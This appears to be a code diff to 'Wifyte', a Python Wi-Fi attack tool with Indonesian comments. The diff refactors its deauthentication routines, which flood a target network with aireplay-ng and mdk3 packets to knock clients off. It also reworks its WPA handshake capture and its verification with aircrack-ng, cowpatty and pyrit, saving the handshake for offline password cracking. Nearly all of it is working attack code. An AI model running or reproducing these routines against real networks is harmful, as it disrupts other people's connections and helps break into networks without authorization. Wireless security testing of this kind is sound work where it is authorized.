@@ -312,7 +312,7 @@ class Wifyte:
         return networks
 
     def deauth_clients(self, network: WiFiNetwork) -> bool:
-        """Melakukan deauth pada semua client di jaringan target dengan metode yang lebih efektif"""
+        """Melakukan deauth pada semua client di jaringan target"""
         if not self.monitor_interface:
             print(
                 f"{Colors.RED}[!] Error: Tidak ada interface monitor mode{Colors.ENDC}"
@@ -320,79 +320,140 @@ class Wifyte:
             return False
 
         print(
-            f"{Colors.BLUE}[*] Melakukan deauth agresif pada {network.essid} ({network.bssid})...{Colors.ENDC}"
+            f"{Colors.BLUE}[*] Melakukan deauth pada {network.essid} ({network.bssid})...{Colors.ENDC}"
         )
 
-        # Metode 1: Deauth broadcast (semua client)
-        deauth_cmd1 = [
+        # Unified deauth command
+        deauth_cmd = [
             "aireplay-ng",
             "--deauth",
-            "120",  # Lebih banyak paket deauth
+            "120",
             "-a",
             network.bssid,
             self.monitor_interface,
         ]
 
-        # Jalankan deauth dalam thread terpisah untuk tidak memblokir program
-        def run_deauth():
-            self.execute_command(deauth_cmd1, capture_output=False)
-
-        deauth_thread = threading.Thread(target=run_deauth)
+        # Jalankan deauth dalam thread terpisah
+        deauth_thread = threading.Thread(
+            target=lambda: self.execute_command(deauth_cmd, capture_output=False)
+        )
         deauth_thread.daemon = True
         deauth_thread.start()
 
-        # Berikan waktu singkat untuk memastikan paket deauth terkirim
         time.sleep(1)
-
         print(f"{Colors.GREEN}[+] Deauth packets berhasil dikirim{Colors.ENDC}")
         return True
 
+    def verify_handshake(self, handshake_path: str) -> bool:
+        """Verifikasi handshake dengan multiple tools"""
+        if not os.path.exists(handshake_path):
+            print(f"{Colors.RED}[!] Error: File handshake tidak ditemukan{Colors.ENDC}")
+            return False
+
+        print(f"{Colors.BLUE}[*] Memverifikasi handshake...{Colors.ENDC}")
+
+        verifications = []
+
+        # Aircrack verification
+        result = self.execute_command(["aircrack-ng", handshake_path])
+        aircrack_valid = result and "1 handshake" in result.stdout
+        if aircrack_valid:
+            print(f"{Colors.GREEN}[+] Aircrack-ng: Handshake valid{Colors.ENDC}")
+            verifications.append(True)
+
+        # Cowpatty verification (optional)
+        cowpatty_path = shutil.which("cowpatty")
+        if cowpatty_path:
+            result = self.execute_command(["cowpatty", "-c", "-r", handshake_path])
+            cowpatty_valid = (
+                result
+                and "Collected all necessary data to mount crack against WPA"
+                in result.stdout
+            )
+            if cowpatty_valid:
+                print(f"{Colors.GREEN}[+] Cowpatty: Handshake valid{Colors.ENDC}")
+                verifications.append(True)
+
+        # Pyrit verification (optional)
+        pyrit_path = shutil.which("pyrit")
+        if pyrit_path:
+            result = self.execute_command(["pyrit", "-r", handshake_path, "analyze"])
+            pyrit_valid = (
+                result
+                and "handshake(s)" in result.stdout
+                and not "0 handshake(s)" in result.stdout
+            )
+            if pyrit_valid:
+                print(f"{Colors.GREEN}[+] Pyrit: Handshake valid{Colors.ENDC}")
+                verifications.append(True)
+
+        is_valid = len(verifications) > 0
+        if is_valid:
+            print(f"{Colors.GREEN}[+] Handshake terverifikasi dan valid!{Colors.ENDC}")
+        else:
+            print(
+                f"{Colors.RED}[!] Handshake tidak valid atau tidak lengkap{Colors.ENDC}"
+            )
+
+        return is_valid
+
+    # check_for_handshake sekarang memanggil verify_handshake
     def check_for_handshake(self, cap_file: str) -> bool:
         """Memeriksa file capture untuk handshake"""
         if not os.path.exists(cap_file):
             return False
-
-        # Metode 1: Menggunakan aircrack-ng
-        aircrack_result = self.execute_command(["aircrack-ng", cap_file])
-        if aircrack_result and "1 handshake" in aircrack_result.stdout:
-            return True
-
-        # Metode 2: Menggunakan cowpatty (jika tersedia) - verifikasi lebih akurat
-        cowpatty_path = shutil.which("cowpatty")
-        if cowpatty_path:
-            cowpatty_result = self.execute_command(["cowpatty", "-c", "-r", cap_file])
-            if (
-                cowpatty_result
-                and "Collected all necessary data to mount crack against WPA"
-                in cowpatty_result.stdout
-            ):
-                return True
-
-        # Metode 3: Menggunakan pyrit (jika tersedia) - verifikasi lebih akurat lagi
-        pyrit_path = shutil.which("pyrit")
-        if pyrit_path:
-            pyrit_result = self.execute_command(["pyrit", "-r", cap_file, "analyze"])
-            if (
-                pyrit_result
-                and "handshake(s)" in pyrit_result.stdout
-                and not "0 handshake(s)" in pyrit_result.stdout
-            ):
-                return True
-
-        return False
+        return self.verify_handshake(cap_file)
 
     def handshake_watcher(self, capture_path: str, network: WiFiNetwork):
         """Thread untuk memantau file capture dan mengecek handshake"""
         cap_file = f"{capture_path}-01.cap"
-        check_interval = 1  # Cek setiap 1 detik
+
+        # Adaptive check interval - mulai cepat, lalu melambat
+        check_interval = 0.5
+        checks_without_file = 0
 
         while not self.stop_capture:
-            if os.path.exists(cap_file) and self.check_for_handshake(cap_file):
-                print(f"{Colors.GREEN}[+] Handshake terdeteksi!{Colors.ENDC}")
-                self.handshake_found = True
-                self.stop_capture = True
-                break
+            if os.path.exists(cap_file):
+                if self.check_for_handshake(cap_file):
+                    print(f"{Colors.GREEN}[+] Handshake terdeteksi!{Colors.ENDC}")
+                    self.handshake_found = True
+                    self.stop_capture = True
+                    break
+                # File ada tapi belum ada handshake, cek lebih jarang
+                check_interval = min(check_interval + 0.5, 2.0)
+            else:
+                # File belum ada, tingkatkan interval setelah beberapa coba
+                checks_without_file += 1
+                if checks_without_file > 5:
+                    check_interval = min(check_interval + 0.5, 1.5)
+
             time.sleep(check_interval)
+
+    def send_deauth(self, network: WiFiNetwork, method: str = "broadcast"):
+        """Fungsi helper untuk mengirim deauth packets dengan berbagai metode"""
+        if method == "broadcast":
+            cmd = [
+                "aireplay-ng",
+                "--deauth",
+                "60",
+                "-a",
+                network.bssid,
+                self.monitor_interface,
+            ]
+            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        elif method == "mdk3" and shutil.which("mdk3"):
+            cmd = ["mdk3", self.monitor_interface, "d", "-b", network.bssid]
+            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        elif method == "aggressive":
+            cmd = [
+                "aireplay-ng",
+                "--deauth",
+                "120",
+                "-a",
+                network.bssid,
+                self.monitor_interface,
+            ]
+            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     def capture_handshake(self, network: WiFiNetwork) -> Optional[str]:
         """Menangkap handshake dari jaringan target dengan metode yang ditingkatkan"""
@@ -406,6 +467,7 @@ class Wifyte:
         timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
         capture_name = f"{network.essid.replace(' ', '_')}_{timestamp}"
         capture_path = os.path.join(self.temp_dir, capture_name)
+        cap_file = f"{capture_path}-01.cap"
 
         print(
             f"{Colors.BLUE}[*] Memulai capture handshake untuk {network.essid}...{Colors.ENDC}"
@@ -427,98 +489,67 @@ class Wifyte:
             self.monitor_interface,
         ]
 
-        capture_proc = subprocess.Popen(
+        # Gunakan konteks manager untuk memastikan cleanup
+        with subprocess.Popen(
             capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-        )
-
-        # Mulai thread watcher untuk memeriksa handshake
-        watcher_thread = threading.Thread(
-            target=self.handshake_watcher, args=(capture_path, network)
-        )
-        watcher_thread.daemon = True
-        watcher_thread.start()
-
-        # Strategi deauth yang lebih agresif
-        max_attempts = 5  # Lebih banyak percobaan
-        attempt = 0
-
-        try:
-            while attempt < max_attempts and not self.handshake_found:
-                attempt += 1
-                print(
-                    f"{Colors.BLUE}[*] Deauth attempt {attempt}/{max_attempts}...{Colors.ENDC}"
-                )
-
-                # Kirim deauth packet dengan pendekatan berbeda di setiap percobaan
-                if attempt % 2 == 0:
-                    # Pendekatan 1: Deauth broadcast
-                    subprocess.Popen(
-                        [
-                            "aireplay-ng",
-                            "--deauth",
-                            "60",
-                            "-a",
-                            network.bssid,
-                            self.monitor_interface,
-                        ],
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                    )
-                else:
-                    # Pendekatan 2: MDK3 deauth (jika tersedia)
-                    mdk3_path = shutil.which("mdk3")
-                    if mdk3_path:
-                        subprocess.Popen(
-                            ["mdk3", self.monitor_interface, "d", "-b", network.bssid],
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL,
-                        )
-                    else:
-                        # Pendekatan fallback: aireplay dengan lebih banyak paket
-                        subprocess.Popen(
-                            [
-                                "aireplay-ng",
-                                "--deauth",
-                                "120",
-                                "-a",
-                                network.bssid,
-                                self.monitor_interface,
-                            ],
-                            stdout=subprocess.DEVNULL,
-                            stderr=subprocess.DEVNULL,
-                        )
-
-                # Tunggu sebentar antara deauth attempts (lebih pendek dari sebelumnya)
-                for i in range(3):
-                    if self.handshake_found:
-                        break
-                    time.sleep(1)
-
-            # Final check jika tidak terdeteksi oleh watcher
-            cap_file = f"{capture_path}-01.cap"
-            if not self.handshake_found and os.path.exists(cap_file):
-                self.handshake_found = self.check_for_handshake(cap_file)
-
-            if not self.handshake_found:
-                print(
-                    f"{Colors.RED}[!] Gagal menangkap handshake setelah {max_attempts} percobaan{Colors.ENDC}"
-                )
-                return None
-
-            # Salin handshake ke direktori handshakes
-            final_path = os.path.join(
-                self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
+        ) as capture_proc:
+            # Mulai thread watcher untuk memeriksa handshake
+            watcher_thread = threading.Thread(
+                target=self.handshake_watcher, args=(capture_path, network)
             )
-            shutil.copy(cap_file, final_path)
-            print(f"{Colors.GREEN}[+] Handshake disimpan ke {final_path}{Colors.ENDC}")
+            watcher_thread.daemon = True
+            watcher_thread.start()
 
-            return final_path
+            # Strategi deauth yang lebih terorganisir
+            deauth_methods = ["broadcast", "mdk3", "aggressive"]
+            max_attempts = 5
+            attempt = 0
 
-        except KeyboardInterrupt:
-            print(f"\n{Colors.YELLOW}[!] Capture dibatalkan oleh user{Colors.ENDC}")
-            return None
-        finally:
-            self.stop_capture = True
+            try:
+                while attempt < max_attempts and not self.handshake_found:
+                    attempt += 1
+                    method = deauth_methods[attempt % len(deauth_methods)]
+                    print(
+                        f"{Colors.BLUE}[*] Deauth attempt {attempt}/{max_attempts} (metode: {method})...{Colors.ENDC}"
+                    )
+
+                    # Gunakan helper function untuk deauth
+                    self.send_deauth(network, method)
+
+                    # Adaptive wait - shorter at first, longer later
+                    wait_time = min(3, 1 + attempt * 0.5)
+                    for _ in range(int(wait_time)):
+                        if self.handshake_found:
+                            break
+                        time.sleep(1)
+
+                # Final check
+                if not self.handshake_found and os.path.exists(cap_file):
+                    self.handshake_found = self.check_for_handshake(cap_file)
+
+                if not self.handshake_found:
+                    print(
+                        f"{Colors.RED}[!] Gagal menangkap handshake setelah {max_attempts} percobaan{Colors.ENDC}"
+                    )
+                    return None
+
+                # Salin handshake ke direktori handshakes
+                final_path = os.path.join(
+                    self.handshake_dir, f"{network.essid.replace(' ', '_')}.cap"
+                )
+                shutil.copy(cap_file, final_path)
+                print(
+                    f"{Colors.GREEN}[+] Handshake disimpan ke {final_path}{Colors.ENDC}"
+                )
+
+                return final_path
+
+            except KeyboardInterrupt:
+                print(f"\n{Colors.YELLOW}[!] Capture dibatalkan oleh user{Colors.ENDC}")
+                return None
+            finally:
+                self.stop_capture = True
+                # capture_proc cleanup handled by context manager
             capture_proc.send_signal(signal.SIGTERM)
             capture_proc.wait()
 
